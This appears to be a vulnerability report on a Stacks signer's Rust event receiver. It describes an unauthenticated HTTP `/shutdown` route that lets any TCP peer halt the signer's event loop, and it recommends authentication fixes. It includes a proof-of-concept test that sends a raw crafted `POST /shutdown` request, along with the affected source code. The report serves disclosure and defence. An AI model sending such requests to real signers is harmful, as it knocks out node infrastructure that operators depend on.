### Title
Unauthenticated remote `/shutdown` endpoint allows any TCP peer to terminate the signer's event loop - ([File: libsigner/src/events.rs])

### Summary
`SignerEventReceiver::bind` opens a plain `tiny_http::Server` with no authentication, and `next_event` dispatches `POST /shutdown` requests directly to `stop_signal.store(true, Ordering::SeqCst)` without verifying the sender is the configured stacks-node. Any remote unprivileged client that can open a TCP connection to the signer's event-listener port can send a single crafted HTTP POST to `/shutdown` and terminate the signer's `main_loop`, silencing its event stream.

### Finding Description
The claimed equality — "every command the signer's event loop obeys == a command issued by the locally configured node" — is broken. `bind()` at [1](#0-0)  creates a `tiny_http::HttpServer` bound to a socket address with no peer/IP allowlist, no shared secret, and no TLS client-cert check. `next_event` at [2](#0-1)  accepts the request, and for `url() == "/shutdown"` unconditionally executes `event_receiver.stop_signal.store(true, Ordering::SeqCst)` and returns `Err(EventError::Terminated)` at [3](#0-2) . `is_stopped()` at [4](#0-3)  reads that same `AtomicBool`, and `main_loop` at [5](#0-4)  checks `is_stopped()` on every iteration and breaks out, ending event processing entirely.

The only "legitimate" caller of this path is `SignerStopSignaler::send`, which itself just opens a `TcpStream::connect` to the local address and writes a raw `POST /shutdown HTTP/1.1...` request — [6](#0-5) . This confirms there is no secret, token, or signature involved in this control message: it is indistinguishable from a message any external TCP client could construct. There is no auth-gate anywhere in `with_server` ( [7](#0-6) ) or in `next_event` prior to the `/shutdown` branch — the only pre-checks are `is_stopped()` and HTTP method (`POST`), neither of which restrict the caller's identity.

### Impact Explanation
A remote unprivileged attacker who can reach the signer's event-listener TCP port can send one crafted HTTP request to permanently stop the signer's event-receiver `main_loop`, which stops it from receiving `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, and `/new_block` events from the actual stacks-node. This is an unauthenticated, single-message, remote DoS against the signer's event pipeline — matching the "Critical: remote crash/unauthenticated DoS from few messages" category. It is fully repeatable (the attacker can just reconnect and resend since `stop_signal` is a stored flag, and restarting the signer process would reopen the same unauthenticated port).

### Likelihood Explanation
Preconditions are minimal: the attacker only needs network reachability to the signer's bound event-listener port (a plain TCP/HTTP socket, no TLS, no credentials). No node peer key, StackerDB slot ownership, or RPC secret is required — the endpoint performs no authentication whatsoever. The attack costs a single crafted HTTP POST and is trivially scriptable.

### Recommendation
Add authentication to the signer's event HTTP endpoint before dispatching state-changing routes like `/shutdown`: e.g., bind the listener to loopback/a private interface only reachable by the local node, and/or require a shared secret/HMAC or mTLS between the stacks-node and the signer's event receiver, validating it in `next_event` before acting on `/shutdown`, `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, and `/new_block`.

### Proof of Concept
```rust
// libsigner/src/events.rs (new test)
#[test]
fn test_unauthenticated_shutdown() {
    use std::net::{TcpStream, SocketAddr};
    use std::io::Write;
    use std::sync::atomic::Ordering;

    let mut receiver: SignerEventReceiver<StacksBlockEvent> = SignerEventReceiver::new(false);
    let bind_addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let addr = receiver.bind(bind_addr).unwrap();

    // Spawn next_event in a thread to process the request
    let handle = std::thread::spawn(move || {
        let _ = receiver.next_event();
        receiver
    });

    // Attacker: plain TCP connection, no auth, no secret
    let mut stream = TcpStream::connect(addr).unwrap();
    let req = "POST /shutdown HTTP/1.1\r\nHost: attacker\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    stream.write_all(req.as_bytes()).unwrap();

    let receiver = handle.join().unwrap();
    assert!(receiver.is_stopped(), "attacker forced stop_signal=true with no auth");
}
```
This reproduces the exact path: raw attacker `TcpStream` → `POST /shutdown` → `events.rs:443-445` → `stop_signal.store(true, ...)` → `is_stopped()` (`events.rs:462-464`) becomes `true` → `main_loop` (`events.rs:284-312`) exits, with no verification that the request originated from the configured stacks-node.

    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }

        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }

            if request.method() != &HttpMethod::Post {
                return Err(EventError::MalformedRequest(format!(
                    "Unrecognized method '{}'",
                    request.method(),
                )));
            }
            debug!("Processing {} event", request.url());
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
            } else {
                let url = request.url().to_string();
                debug!(
                    "[{:?}] next_event got request with unexpected url {}, return OK so other side doesn't keep sending this",
                    event_receiver.local_addr,
                    url
                );
                ack_dispatcher(request);
                Err(EventError::UnrecognizedEvent(url))
            }
        })?
    }
